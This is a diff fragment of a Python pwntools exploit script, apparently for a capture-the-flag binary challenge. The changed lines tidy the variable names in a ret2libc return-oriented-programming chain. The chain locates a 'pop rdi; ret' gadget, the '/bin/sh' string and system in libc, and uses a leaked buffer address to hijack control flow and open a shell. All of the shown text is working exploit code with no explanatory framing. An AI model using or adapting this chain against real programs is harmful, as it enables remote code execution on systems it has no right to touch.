@@ -280,15 +280,15 @@ log.success(f"Libc Base: {hex(libc.address)}")
 
 # rop exploit
 rop = ROP(libc)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] 
-ret_gadget = rop.find_gadget(['ret'])[0]         
-system_addr = libc.symbols['system']
-bin_sh_addr = next(libc.search(b'/bin/sh'))
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh = next(libc.search(b'/bin/sh'))
+ret = rop.find_gadget(['ret'])[0]
+system = libc.symbols['system']
 
 log.info(f"pop_rdi: {hex(pop_rdi)}")
-log.info(f"bin_sh : {hex(bin_sh_addr)}")
+log.info(f"bin_sh : {hex(bin_sh)}")
 
-chain = [pop_rdi, bin_sh_addr, ret_gadget, system_addr]
+chain = [pop_rdi, bin_sh, ret, system]
 
 ret_addr = buffer_leak + 0x48
 
